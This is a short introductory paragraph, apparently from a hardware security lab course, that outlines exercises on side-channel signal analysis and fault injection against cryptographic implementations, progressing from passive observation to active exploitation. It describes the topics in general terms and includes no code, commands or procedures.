This laboratory sequence equips hardware security practitioners with the instrumentation skills, signal analysis techniques, and exploit development methodologies necessary to assess cryptographic implementations against physical attack vectors. The exercises progress from passive observation through active interrogation to adversarial exploitation, mirroring the escalation sequence in real penetration testing engagements. Mastery of these techniques requires extensive hands-on practice and adaptation to target-specific characteristics; the procedures documented here provide the foundational framework for developing expertise in hardware-based cryptanalysis and fault injection attacks.
